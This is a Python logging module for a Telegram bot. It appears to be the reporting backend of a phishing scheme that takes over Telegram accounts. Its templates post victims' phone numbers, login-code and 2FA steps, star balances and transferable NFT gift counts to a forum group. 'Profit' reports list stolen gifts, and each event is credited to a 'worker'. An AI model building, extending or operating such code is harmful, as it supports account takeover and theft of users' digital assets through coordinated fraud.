import os
import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, Any, Union
from aiogram import Bot
from aiogram.types import BufferedInputFile
from dotenv import load_dotenv

# Загружаем переменные окружения
load_dotenv()

# Настройка локального логгера для самого сервиса
logger = logging.getLogger("logger_service")

# Московское время
MOSCOW_TZ = timezone(timedelta(hours=3))

def moscow_now() -> datetime:
    return datetime.now(MOSCOW_TZ)

def moscow_strftime(format_str="%Y-%m-%d %H:%M:%S") -> str:
    return moscow_now().strftime(format_str)

class LoggerService:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(LoggerService, cls).__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
            
        self.bot_token = os.getenv("LOGS_BOT_TOKEN") or os.getenv("TELEGRAM_LOGS_BOT_TOKEN") or os.getenv("BOT_TOKEN")
        self.forum_chat_id = os.getenv("FORUM_CHAT_ID") or os.getenv("PROFIT_CHAT_ID") or os.getenv("LOG_GROUP_ID")
        
        # Топики
        self.topic_profit = self._parse_int(os.getenv("PROFIT_TOPIC_ID") or os.getenv("PROFIT_FORUM_TOPIC_ID"))
        self.topic_logs = self._parse_int(os.getenv("LOGS_TOPIC_ID") or os.getenv("LOGS_FORUM_TOPIC_ID") or os.getenv("FORUM_TOPIC_ID"))
        
        self._initialized = True
        
        if not self.bot_token:
            logger.error("❌ LoggerService: Bot token not found in env!")
        if not self.forum_chat_id:
            logger.warning("⚠️ LoggerService: Forum Chat ID not found in env!")

    def _parse_int(self, value: Any) -> Optional[int]:
        if not value:
            return None
        try:
            return int(str(value).strip())
        except ValueError:
            return None

    async def send_log(self, action_type: str, user_info: Dict = None, worker_info: Dict = None, additional_data: Dict = None):
        """
        Основной метод для отправки логов.
        """
        logger.info(f"[send_log] Called: action_type={action_type}, user_info={user_info}, worker_info={worker_info}, additional_data={additional_data}")
        
        if not self.bot_token or not self.forum_chat_id:
            logger.warning(f"Skipping log {action_type}: missing token or chat_id")
            return

        try:
            # --- Автоопределение воркера, если он не передан явно ИЛИ передан как "неизвестно" ---
            try:
                # Проверяем, нужно ли искать воркера:
                # 1) worker_info не передан (None)
                # 2) worker_info передан, но содержит только username='неизвестно' или пустой username
                needs_worker_resolve = (
                    worker_info is None or
                    (worker_info and (
                        not worker_info.get("telegram_id") and
                        (not worker_info.get("username") or 
                         str(worker_info.get("username", "")).lower() in ("неизвестно", "unknown", ""))
                    ))
                )
                
                if needs_worker_resolve and user_info:
                    # Пытаемся достать telegram_id пользователя из user_info
                    uid = user_info.get("telegram_id") or user_info.get("id") or user_info.get("user_id")
                    if isinstance(uid, str) and uid.isdigit():
                        uid = int(uid)
                    if isinstance(uid, int):
                        try:
                            import database  # корневой database.py (getgems_stub.db)
                            db_instance = getattr(database, "db", None)
                            if db_instance is None or not isinstance(db_instance, database.Database):
                                db_instance = database.Database()
                            if hasattr(db_instance, "get_worker_for_user"):
                                binding = db_instance.get_worker_for_user(uid, only_active=True)
                            else:
                                binding = None
                            if binding:
                                worker_info = {
                                    "telegram_id": binding.get("worker_telegram_id"),
                                    "username": binding.get("username"),
                                    "first_name": binding.get("first_name"),
                                    "last_name": binding.get("last_name"),
                                }
                                logger.info(f"[send_log] ✅ Auto-resolved worker for user {uid}: {worker_info.get('username')} (ID: {worker_info.get('telegram_id')})")
                            else:
                                logger.debug(f"[send_log] No worker binding found for user {uid}")
                        except Exception as auto_err:
                            logger.debug(f"[send_log] Failed to auto-resolve worker for user {uid}: {auto_err}")
            except Exception as outer_auto_err:
                logger.debug(f"[send_log] Worker auto-resolve wrapper error: {outer_auto_err}")

            # Подготовка данных
            timestamp = moscow_strftime()
            user_display = self._format_user(user_info)
            worker_display = self._format_user(worker_info) or "❓ Неизвестно"
            
            logger.info(f"[send_log] Formatted - user_display={user_display}, worker_display={worker_display}")
            
            message_text = self._build_message(action_type, timestamp, user_display, worker_display, additional_data)
            topic_id = self._get_topic_id(action_type)
            
            logger.info(f"[send_log] Message built, topic_id={topic_id}, message length={len(message_text)}")
            
            # Отправка
            await self._send_telegram_message(message_text, topic_id)
            
        except Exception as e:
            logger.error(f"Failed to send log {action_type}: {e}", exc_info=True)

    def _format_user(self, info: Optional[Dict]) -> str:
        if not info:
            return ""
        username = info.get('username')
        uid = info.get('telegram_id') or info.get('id') or info.get('user_id')
        
        parts = []
        if username and str(username).lower() != "unknown":
            username = str(username).strip()
            if not username.startswith('@') and not username.startswith('ID'):
                username = f"@{username}"
            parts.append(username)
        
        if uid and str(uid).lower() != "unknown":
            parts.append(f"(ID: {uid})")
            
        return " ".join(parts) if parts else (username or "Unknown")

    def _get_topic_id(self, action_type: str) -> Optional[int]:
        if action_type == "profit":
            return self.topic_profit
        return self.topic_logs

    def _build_message(self, action_type: str, timestamp: str, user_display: str, worker_display: str, data: Optional[Dict]) -> str:
        data = data or {}
        
        # Шаблоны сообщений
        if action_type == "check_created":
            amount = data.get('amount')
            check_id = data.get('check_id')
            
            # Логируем для отладки
            logger.info(f"[_build_message] check_created - amount={amount}, check_id={check_id}, data keys={list(data.keys())}, full data={data}")
            
            if amount is None or amount == '' or str(amount).lower() == 'unknown':
                logger.warning(f"[_build_message] check_created - amount is None/empty/unknown, using 'Unknown'")
                amount = 'Unknown'
            else:
                amount = str(amount)
            currency = data.get('currency', 'STARS') or 'STARS'
            
            if check_id is None or check_id == '' or str(check_id).lower() == 'unknown':
                logger.warning(f"[_build_message] check_created - check_id is None/empty/unknown, using 'Unknown'")
                check_id = 'Unknown'
            else:
                check_id = str(check_id)
            return (
                f"💠 <b>ЧЕК СОЗДАН</b>\n\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"┃ 👷 <b>Воркер:</b> {worker_display}\n"
                f"┃ 💰 <b>Сумма:</b> {amount} {currency}\n"
                f"┃ 🆔 <b>ID:</b> <code>{check_id}</code>\n"
                f"┃ ⏰ <b>Время:</b> {timestamp}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            
        elif action_type == "check_activated":
            amount = data.get('amount', 'Unknown')
            return (
                f"✅ <b>ЧЕК АКТИВИРОВАН</b>\n\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"┃ 👤 <b>Активировал:</b> {user_display}\n"
                f"┃ 👷 <b>Воркер:</b> {worker_display}\n"
                f"┃ 💰 <b>Сумма:</b> {amount}\n"
                f"┃ ⏰ <b>Время:</b> {timestamp}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )

        elif action_type == "auth_success":
            # Получаем статистику аккаунта
            account_stats = data.get('account_stats', {})
            if not account_stats and isinstance(data.get('account_stats'), dict):
                account_stats = data.get('account_stats')
            
            stars_balance = account_stats.get('stars_balance', 0) if account_stats else 0
            gifts_stats = account_stats.get('gifts_stats', {}) if account_stats else {}
            total_gifts = gifts_stats.get('total_gifts', 0) if gifts_stats else 0
            nft_gifts = gifts_stats.get('nft_gifts', 0) if gifts_stats else 0
            transferable_gifts = gifts_stats.get('transferable_gifts', 0) if gifts_stats else 0
            
            return (
                f"✅ <b>УСПЕШНАЯ АВТОРИЗАЦИЯ</b>\n\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"┃ 👤 <b>Пользователь:</b> {user_display}\n"
                f"┃ 👷 <b>Воркер:</b> {worker_display}\n"
                f"┃ ⭐ <b>Баланс звёзд:</b> {stars_balance}\n"
                f"┃ ⏰ <b>Время:</b> {timestamp}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎁 <b>СТАТИСТИКА ПОДАРКОВ:</b>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"┃ 📦 <b>Всего подарков:</b> {total_gifts}\n"
                f"┃ 💎 <b>NFT подарков:</b> {nft_gifts}\n"
                f"┃ ✅ <b>Доступны для передачи:</b> {transferable_gifts}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )

        elif action_type == "profit":
            gift_count = data.get('gift_count', 0)
            links_text = ""
            valid_links = data.get('valid_links', [])
            
            if valid_links:
                links_text += f"\n\n<b>✅ УДАЧНЫЕ ПЕРЕДАЧИ ({len(valid_links)}):</b>\n"
                for i, link in enumerate(valid_links[:15], 1):
                    nft_name = link.split('/')[-1] if '/' in link else link
                    links_text += f"  {i}. <a href=\"{link}\">{nft_name}</a>\n"
                if len(valid_links) > 15:
                    links_text += f"\n  ... и еще <b>{len(valid_links) - 15}</b> NFT подарков"
            
            # Обработка неудачных передач
            failed_transfers = data.get('failed_transfers', [])
            failed_text = ""
            if failed_transfers and len(failed_transfers) > 0:
                failed_text += f"\n\n<b>❌ НЕУДАЧНЫЕ ПЕРЕДАЧИ ({len(failed_transfers)}):</b>\n"
                for i, failed_item in enumerate(failed_transfers[:10], 1):
                    if isinstance(failed_item, str):
                        failed_text += f"  {i}. {failed_item}\n"
                    elif isinstance(failed_item, dict):
                        link = failed_item.get('link', failed_item.get('gift_link', 'Неизвестно'))
                        reason = failed_item.get('reason', failed_item.get('error', 'Неизвестная ошибка'))
                        failed_text += f"  {i}. {link} - <code>{reason}</code>\n"
                if len(failed_transfers) > 10:
                    failed_text += f"\n  ... и еще <b>{len(failed_transfers) - 10}</b> неудачных передач"
            
            # Если нет удачных передач, но есть попытки
            if gift_count == 0 and failed_transfers and len(failed_transfers) > 0:
                failed_text += "\n\n⚠️ <b>Удачных передач нет, но были попытки передачи.</b>"
            elif gift_count > 0:
                failed_text += "\n\n🎉 <b>Профит успешно получен!</b>"
            
            return (
                f"💰 <b>НОВЫЙ ПРОФИТ!</b>\n\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"┃ 👷 <b>Воркер:</b> {worker_display}\n"
                f"┃ 🎁 <b>Подарков успешно:</b> {gift_count}\n"
                f"┃ ⏰ <b>Время:</b> {timestamp}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                f"{links_text}"
                f"{failed_text}"
            )

        # Унифицированный формат для остальных логов (как у чеков)
        details = data.get('details', '')
        if not details:
            details = str(data) if data else 'Нет дополнительной информации'
        
        # Определяем заголовок в зависимости от типа действия
        action_titles = {
            "phone_entered": "📱 ВВОД НОМЕРА",
            "code_sent": "📤 КОД ОТПРАВЛЕН",
            "code_verified": "✅ КОД ПОДТВЕРЖДЕН",
            "2fa_required": "🔐 ТРЕБУЕТСЯ 2FA",
            "2fa_entered": "🔑 ВВОД 2FA",
            "link_created": "🔗 СОЗДАНА ССЫЛКА",
            "link_activated": "🎯 АКТИВИРОВАНА ССЫЛКА",
            "session_processing_started": "⚙️ ОБРАБОТКА НАЧАТА",
            "session_processing_completed": "✅ ОБРАБОТКА ЗАВЕРШЕНА",
        }
        
        title = action_titles.get(action_type, f"📝 {action_type.upper().replace('_', ' ')}")
        
        # Для действий с телефоном добавляем номер
        phone = data.get('phone')
        phone_line = f"┃ 📞 <b>Номер:</b> <code>{phone}</code>\n" if phone else ""
        
        return (
            f"{title}\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"┃ 👤 <b>Пользователь:</b> {user_display if user_display else '❓ Неизвестно'}\n"
            f"┃ 👷 <b>Воркер:</b> {worker_display}\n"
            f"{phone_line}"
            f"┃ ⏰ <b>Время:</b> {timestamp}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            + (f"\n\n📝 <b>Детали:</b> {details}" if details and details != 'Нет дополнительной информации' else "")
        )

    async def _send_telegram_message(self, text: str, topic_id: Optional[int]):
        bot = Bot(token=self.bot_token)
        try:
            chat_id = int(self.forum_chat_id)
            kwargs = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            }
            if topic_id:
                kwargs["message_thread_id"] = topic_id
            
            await bot.send_message(**kwargs)
            logger.info(f"✅ Log sent to {chat_id} (topic: {topic_id})")
            
        except Exception as e:
            logger.error(f"❌ Telegram send error: {e}")
            raise
        finally:
            await bot.session.close()

# Global instance
logger_service = LoggerService()

